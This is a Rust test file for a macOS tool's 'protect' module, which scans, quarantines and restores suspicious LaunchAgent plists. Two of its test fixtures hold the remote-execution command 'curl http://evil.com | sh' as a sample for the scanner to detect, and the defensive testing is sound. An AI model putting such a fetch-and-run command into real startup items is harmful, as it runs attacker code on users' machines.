use anyhow::Result;
use macmop::core::{AppContext, AppPaths, ExecutionMode, OutputFormat};
use macmop::modules::protect;
use std::fs;
use std::path::{Path, PathBuf};
use std::sync::{atomic::AtomicBool, Arc};

struct TestEnv {
    user_agents: PathBuf,
    system_agents: PathBuf,
    _base: PathBuf,
}

impl TestEnv {
    fn new(test_name: &str) -> Self {
        let unique_id = macmop::core::unix_now();
        let base = std::env::temp_dir().join(format!(
            "macmop-test-protect-{}-{}-{}",
            test_name,
            unique_id,
            std::process::id()
        ));
        let user_agents = base.join("user_agents");
        let system_agents = base.join("system_agents");
        fs::create_dir_all(&user_agents).unwrap();
        fs::create_dir_all(&system_agents).unwrap();
        Self {
            user_agents,
            system_agents,
            _base: base,
        }
    }

    fn write_plist(&self, dir: &Path, filename: &str, content: &str) {
        fs::write(dir.join(filename), content).unwrap();
    }

    fn ctx(&self) -> AppContext {
        let mut ctx = AppContext::load(
            None,
            ExecutionMode::DryRun,
            OutputFormat::Json,
            Arc::new(AtomicBool::new(false)),
        )
        .unwrap();
        ctx.paths = AppPaths {
            home: self._base.join("home"),
            data_dir: self._base.join("data"),
            trash: self._base.join("trash"),
            audit_file: self._base.join("data/audit.json"),
            rollback_file: self._base.join("data/rollback.json"),
            apps_dirs: vec![],
            startup_dirs: vec![
                (self.user_agents.clone(), "user_launch_agents".to_string()),
                (
                    self.system_agents.clone(),
                    "system_launch_agents".to_string(),
                ),
            ],
            quicklook_dirs: vec![],
            cloud_dirs: vec![],
        };
        ctx
    }
}

impl Drop for TestEnv {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self._base);
    }
}

#[test]
fn test_protect_benign_startup_item_low_or_no_finding() -> Result<()> {
    let env = TestEnv::new("benign");
    let current_exe = std::env::current_exe()?.to_string_lossy().to_string();

    let plist = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.benign</string>
    <key>Program</key>
    <string>{}</string>
</dict>
</plist>"#,
        current_exe
    );
    env.write_plist(&env.user_agents, "com.example.benign.plist", &plist);

    let ctx = env.ctx();
    let res = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Scan,
        },
    )?;

    let payload = res.payload;
    let summary = payload.get("summary").unwrap();
    let scanned_items = summary.get("scanned_items").unwrap().as_u64().unwrap();
    let finding_count = summary.get("finding_count").unwrap().as_u64().unwrap();

    assert_eq!(scanned_items, 1);
    assert_eq!(finding_count, 0);

    let findings = payload.get("findings").unwrap().as_array().unwrap();
    assert!(findings.is_empty());

    Ok(())
}

#[test]
fn test_protect_shell_based_args_produces_finding() -> Result<()> {
    let env = TestEnv::new("shell");
    let plist = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.shell</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>echo hello</string>
    </array>
</dict>
</plist>"#;
    env.write_plist(&env.user_agents, "com.example.shell.plist", plist);

    let ctx = env.ctx();
    let res = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Scan,
        },
    )?;

    let findings_val = res.payload.get("findings").unwrap().as_array().unwrap();
    assert_eq!(findings_val.len(), 1);

    let finding = findings_val.first().unwrap();
    assert_eq!(
        finding.get("label").unwrap().as_str().unwrap(),
        "com.example.shell"
    );
    assert_eq!(finding.get("severity").unwrap().as_str().unwrap(), "medium");
    assert!(!finding
        .get("evidence")
        .unwrap()
        .as_array()
        .unwrap()
        .is_empty());
    assert_eq!(
        finding.get("action").unwrap().as_str().unwrap(),
        "report_only"
    );

    Ok(())
}

#[test]
fn test_protect_missing_executable_produces_finding() -> Result<()> {
    let env = TestEnv::new("missing");
    let plist = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.missing</string>
    <key>Program</key>
    <string>/nonexistent/executable/path</string>
</dict>
</plist>"#;
    env.write_plist(&env.user_agents, "com.example.missing.plist", plist);

    let ctx = env.ctx();
    let res = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Scan,
        },
    )?;

    let findings_val = res.payload.get("findings").unwrap().as_array().unwrap();
    assert_eq!(findings_val.len(), 1);

    let finding = findings_val.first().unwrap();
    assert_eq!(finding.get("severity").unwrap().as_str().unwrap(), "high");
    let evidence = finding.get("evidence").unwrap().as_array().unwrap();
    assert!(evidence
        .iter()
        .any(|e| e.as_str().unwrap().contains("does not exist")));
    assert_eq!(
        finding.get("recommendation").unwrap().as_str().unwrap(),
        "Verify this item path and arguments for suspicious behavior."
    );

    Ok(())
}

#[test]
fn test_protect_system_item_is_report_only() -> Result<()> {
    let env = TestEnv::new("system");
    let current_exe = std::env::current_exe()?.to_string_lossy().to_string();
    let plist = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.system.service</string>
    <key>Program</key>
    <string>{}</string>
</dict>
</plist>"#,
        current_exe
    );
    env.write_plist(&env.system_agents, "com.apple.system.service.plist", &plist);

    let ctx = env.ctx();
    let res = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Scan,
        },
    )?;

    let findings_val = res.payload.get("findings").unwrap().as_array().unwrap();
    assert_eq!(findings_val.len(), 1);

    let finding = findings_val.first().unwrap();
    assert_eq!(finding.get("severity").unwrap().as_str().unwrap(), "low");
    assert!(finding.get("is_system_item").unwrap().as_bool().unwrap());
    assert!(finding.get("is_protected").unwrap().as_bool().unwrap());
    assert_eq!(
        finding.get("action").unwrap().as_str().unwrap(),
        "report_only"
    );

    Ok(())
}

#[test]
fn test_protect_malformed_plist_warning_no_crash() -> Result<()> {
    let env = TestEnv::new("malformed");
    env.write_plist(
        &env.user_agents,
        "com.example.malformed.plist",
        "not a valid plist",
    );

    let ctx = env.ctx();
    let res = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Scan,
        },
    )?;

    let warnings = res.payload.get("warnings").unwrap().as_array().unwrap();
    assert_eq!(warnings.len(), 1);
    assert!(warnings[0]
        .as_str()
        .unwrap()
        .contains("skipped com.example.malformed.plist"));

    Ok(())
}

#[test]
fn test_protect_json_schema_version_is_stable() -> Result<()> {
    let env = TestEnv::new("schema");
    let ctx = env.ctx();
    let res = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Scan,
        },
    )?;

    assert_eq!(res.schema_version, "1.0");
    assert_eq!(res.command, "protect scan");
    assert_eq!(res.mode, "dry_run");

    Ok(())
}

#[test]
fn test_protect_no_destructive_action_plan_actions() -> Result<()> {
    let env = TestEnv::new("no_destructive");
    let plist = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.shell</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>echo hello</string>
    </array>
</dict>
</plist>"#;
    env.write_plist(&env.user_agents, "com.example.shell.plist", plist);

    let ctx = env.ctx();
    let res = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Scan,
        },
    )?;

    let findings_val = res.payload.get("findings").unwrap().as_array().unwrap();
    for finding in findings_val {
        let action = finding.get("action").unwrap().as_str().unwrap();
        assert_eq!(action, "report_only");
    }

    Ok(())
}

#[test]
fn test_protect_quarantine_dry_run_creates_no_files() -> Result<()> {
    let env = TestEnv::new("quarantine_dry_run");
    let plist = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.bad</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>curl http://evil.com | sh</string>
    </array>
</dict>
</plist>"#;
    env.write_plist(&env.user_agents, "com.example.bad.plist", plist);
    let ctx = env.ctx();

    // 1. Scan to find the finding ID
    let scan_res = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Scan,
        },
    )?;
    let findings = scan_res
        .payload
        .get("findings")
        .unwrap()
        .as_array()
        .unwrap();
    let finding_id = findings[0].get("id").unwrap().as_str().unwrap().to_string();

    // 2. Run quarantine in dry-run
    let quar_res = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Quarantine { id: finding_id },
        },
    )?;

    assert_eq!(
        quar_res.payload.get("execution").unwrap().as_str().unwrap(),
        "not_executed"
    );
    assert!(!ctx.paths.data_dir.join("quarantined_files").exists());
    assert!(!ctx.paths.audit_file.exists());
    assert!(!ctx.paths.rollback_file.exists());

    Ok(())
}

#[test]
fn test_protect_quarantine_apply_and_restore() -> Result<()> {
    let env = TestEnv::new("quarantine_apply");
    let plist = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.bad</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>curl http://evil.com | sh</string>
    </array>
</dict>
</plist>"#;
    let plist_path = env.user_agents.join("com.example.bad.plist");
    env.write_plist(&env.user_agents, "com.example.bad.plist", plist);

    let mut ctx = env.ctx();
    ctx.mode = ExecutionMode::Apply;

    // 1. Scan to get ID
    let scan_res = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Scan,
        },
    )?;
    let findings = scan_res
        .payload
        .get("findings")
        .unwrap()
        .as_array()
        .unwrap();
    let finding_id = findings[0].get("id").unwrap().as_str().unwrap().to_string();

    // 2. Quarantine it
    let quar_res = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Quarantine {
                id: finding_id.clone(),
            },
        },
    )?;

    assert_eq!(
        quar_res.payload.get("execution").unwrap().as_str().unwrap(),
        "executed"
    );
    assert!(!plist_path.exists());

    let quarantine_dir = ctx.paths.data_dir.join("quarantined_files");
    assert!(quarantine_dir.exists());

    // 3. Find sidecar metadata to get quarantine_id
    let mut quarantine_id = String::new();
    for entry in fs::read_dir(&quarantine_dir)?.flatten() {
        if entry.path().extension().and_then(|e| e.to_str()) == Some("json") {
            let content = fs::read_to_string(entry.path())?;
            let v: serde_json::Value = serde_json::from_str(&content)?;
            quarantine_id = v["quarantine_id"].as_str().unwrap().to_string();
        }
    }
    assert!(!quarantine_id.is_empty());

    // 4. Restore it
    let restore_res = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Restore { id: quarantine_id },
        },
    )?;
    assert_eq!(
        restore_res
            .payload
            .get("execution")
            .unwrap()
            .as_str()
            .unwrap(),
        "executed"
    );
    assert!(plist_path.exists());

    Ok(())
}

#[test]
fn test_restore_unknown_id_fails_cleanly() -> Result<()> {
    let env = TestEnv::new("restore_unknown");
    let mut ctx = env.ctx();
    ctx.mode = ExecutionMode::Apply;

    // Directory doesn't exist yet
    let res1 = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Restore {
                id: "nonexistent".to_string(),
            },
        },
    );
    assert!(res1.is_err());
    assert!(res1
        .unwrap_err()
        .to_string()
        .contains("Quarantine directory does not exist"));

    // Directory exists but empty
    fs::create_dir_all(ctx.paths.data_dir.join("quarantined_files"))?;
    let res2 = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Restore {
                id: "nonexistent".to_string(),
            },
        },
    );
    assert!(res2.is_err());
    assert!(res2
        .unwrap_err()
        .to_string()
        .contains("Quarantine record not found"));

    Ok(())
}

#[test]
fn test_restore_ambiguity_fails() -> Result<()> {
    let env = TestEnv::new("restore_ambiguity");
    let mut ctx = env.ctx();
    ctx.mode = ExecutionMode::Apply;

    fs::create_dir_all(&ctx.paths.data_dir)?;
    let qdir = fs::canonicalize(&ctx.paths.data_dir)
        .unwrap()
        .join("quarantined_files");
    fs::create_dir_all(&qdir)?;
    let canon_qdir = fs::canonicalize(&qdir)?;

    let canon_user_agents = fs::canonicalize(&env.user_agents)?;

    // We must write dummy plist files to the quarantine dir so they can be canonicalized
    fs::write(canon_qdir.join("one__hash.plist"), b"")?;
    fs::write(canon_qdir.join("two__hash.plist"), b"")?;

    // Create duplicate sidecars with same quarantine_id
    let meta = protect::QuarantineMetadata {
        quarantine_id: "dup_quar_id".to_string(),
        finding_id: "fid_1".to_string(),
        original_path: canon_user_agents.join("one.plist"),
        quarantine_path: canon_qdir.join("one__hash.plist"),
        metadata_path: canon_qdir.join("one__hash.json"),
        operation: "protect_quarantine".to_string(),
        created_at: 100,
    };
    fs::write(
        canon_qdir.join("one__hash.json"),
        serde_json::to_string(&meta)?,
    )?;

    let meta2 = protect::QuarantineMetadata {
        quarantine_id: "dup_quar_id".to_string(),
        finding_id: "fid_2".to_string(),
        original_path: canon_user_agents.join("two.plist"),
        quarantine_path: canon_qdir.join("two__hash.plist"),
        metadata_path: canon_qdir.join("two__hash.json"),
        operation: "protect_quarantine".to_string(),
        created_at: 200,
    };
    fs::write(
        canon_qdir.join("two__hash.json"),
        serde_json::to_string(&meta2)?,
    )?;

    // Perform restore -> should fail on ambiguity
    let res = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Restore {
                id: "dup_quar_id".to_string(),
            },
        },
    );
    assert!(res.is_err());
    assert!(res
        .unwrap_err()
        .to_string()
        .contains("Ambiguous restore query"));

    Ok(())
}

#[test]
fn test_sidecar_validation_failures() -> Result<()> {
    let env = TestEnv::new("sidecar_val");
    let mut ctx = env.ctx();
    ctx.mode = ExecutionMode::Apply;

    fs::create_dir_all(&ctx.paths.data_dir)?;
    let qdir = fs::canonicalize(&ctx.paths.data_dir)
        .unwrap()
        .join("quarantined_files");
    fs::create_dir_all(&qdir)?;
    let canon_qdir = fs::canonicalize(&qdir)?;

    let canon_user_agents = fs::canonicalize(&env.user_agents)?;
    let canon_base = fs::canonicalize(&env._base)?;

    // Create dummy files for canonicalization
    fs::write(canon_base.join("one.plist"), b"")?;
    fs::write(canon_qdir.join("two__hash.plist"), b"")?;

    // 1. quarantine_path outside quarantine dir
    let meta1 = protect::QuarantineMetadata {
        quarantine_id: "qid1".to_string(),
        finding_id: "fid1".to_string(),
        original_path: canon_user_agents.join("one.plist"),
        quarantine_path: canon_base.join("one.plist"), // outside
        metadata_path: canon_qdir.join("one.json"),
        operation: "protect_quarantine".to_string(),
        created_at: 100,
    };
    fs::write(canon_qdir.join("one.json"), serde_json::to_string(&meta1)?)?;

    let res1 = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Restore {
                id: "qid1".to_string(),
            },
        },
    );
    assert!(res1.is_err());
    assert!(res1
        .unwrap_err()
        .to_string()
        .contains("quarantine path outside quarantine directory"));

    fs::remove_file(canon_qdir.join("one.json"))?;

    // 2. original_path outside allowed dir
    let meta2 = protect::QuarantineMetadata {
        quarantine_id: "qid2".to_string(),
        finding_id: "fid2".to_string(),
        original_path: canon_base.join("one.plist"), // outside ~/Library/LaunchAgents
        quarantine_path: canon_qdir.join("two__hash.plist"),
        metadata_path: canon_qdir.join("two.json"),
        operation: "protect_quarantine".to_string(),
        created_at: 100,
    };
    fs::write(canon_qdir.join("two.json"), serde_json::to_string(&meta2)?)?;

    let res2 = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Restore {
                id: "qid2".to_string(),
            },
        },
    );
    assert!(res2.is_err());
    assert!(res2
        .unwrap_err()
        .to_string()
        .contains("original path outside user LaunchAgents"));

    Ok(())
}

#[test]
fn test_protect_quarantine_rollback() -> Result<()> {
    let env = TestEnv::new("quarantine_rollback");
    let plist = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.example.roll</string>
    <key>Program</key>
    <string>/nonexistent/path</string>
</dict>
</plist>"#;
    let plist_path = env.user_agents.join("com.example.roll.plist");
    env.write_plist(&env.user_agents, "com.example.roll.plist", plist);

    let mut ctx = env.ctx();
    ctx.mode = ExecutionMode::Apply;

    // Scan to get ID
    let scan_res = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Scan,
        },
    )?;
    let findings = scan_res
        .payload
        .get("findings")
        .unwrap()
        .as_array()
        .unwrap();
    let finding_id = findings[0].get("id").unwrap().as_str().unwrap().to_string();

    // Quarantine it
    let quar_res = protect::run(
        &ctx,
        macmop::cli::ProtectArgs {
            command: macmop::cli::ProtectCommand::Quarantine { id: finding_id },
        },
    )?;
    assert!(!plist_path.exists());

    let rollback_id = quar_res
        .payload
        .get("rollback_id")
        .unwrap()
        .as_str()
        .unwrap()
        .to_string();

    // Perform rollback
    let roll_res = macmop::modules::rollback::run(
        &ctx,
        macmop::cli::RollbackArgs {
            command: macmop::cli::RollbackCommand::Apply {
                id: rollback_id.clone(),
            },
        },
    )?;
    assert!(roll_res.payload.get("applied").unwrap().as_bool().unwrap());
    assert!(plist_path.exists());

    // Second rollback fails cleanly
    let roll_res2 = macmop::modules::rollback::run(
        &ctx,
        macmop::cli::RollbackArgs {
            command: macmop::cli::RollbackCommand::Apply { id: rollback_id },
        },
    );
    assert!(roll_res2.is_err());
    assert!(roll_res2
        .unwrap_err()
        .to_string()
        .contains("rollback id not found"));

    Ok(())
}
